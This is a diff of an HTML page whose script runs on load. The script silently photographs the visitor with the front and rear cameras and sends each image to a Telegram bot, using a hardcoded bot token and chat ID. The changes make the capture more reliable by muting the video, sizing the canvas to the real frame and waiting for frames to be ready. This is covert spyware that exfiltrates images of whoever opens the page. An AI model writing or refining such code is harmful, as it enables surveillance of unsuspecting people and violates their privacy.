@@ -19,57 +19,57 @@
 </head>
 <body>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="320" height="240"></canvas>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
 <script>
     const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
     const CHAT_ID  = "7880376636";
 
-    function sendToTelegram(imageBlob) {
+    function sendToTelegram(blob) {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
-        formData.append("photo", imageBlob);
-
+        formData.append("photo", blob);
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
         }).catch(err => console.log("Telegram xato"));
     }
 
-    // Kamera turlari: "user" = old, "environment" = orqa
-    const cameras = ["user", "environment"];
+    const cameras = ["user", "environment"]; // old + orqa
 
-    function captureFromCamera(index) {
-        if(index >= cameras.length) return; // barcha kameralar tugadi
+    function captureCamera(index) {
+        if (index >= cameras.length) return;
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: cameras[index] } })
         .then(stream => {
             const video = document.getElementById("video");
             video.srcObject = stream;
 
-            video.addEventListener('canplay', () => {
-                setTimeout(() => {
+            // Video haqiqatdan tayyor bo'lishini kutish
+            function tryCapture() {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
                     const canvas = document.getElementById("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     const ctx = canvas.getContext("2d");
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     canvas.toBlob(blob => {
                         sendToTelegram(blob);
-
-                        // Kamera o'chadi va keyingi kameraga o'tadi
-                        stream.getTracks().forEach(track => track.stop());
-                        captureFromCamera(index + 1);
+                        stream.getTracks().forEach(t => t.stop());
+                        captureCamera(index + 1);
                     }, "image/jpeg", 0.9);
-
-                }, 500); // video barqaror bo'lishi uchun
-            }, { once: true });
+                } else {
+                    requestAnimationFrame(tryCapture); // video tayyor bo‘lguncha kutish
+                }
+            }
+            tryCapture();
         })
         .catch(err => console.log("Kameraga ruxsat berilmadi"));
     }
 
-    // Birinchi kameradan boshlash
-    captureFromCamera(0);
+    captureCamera(0);
 </script>
 
 </body>
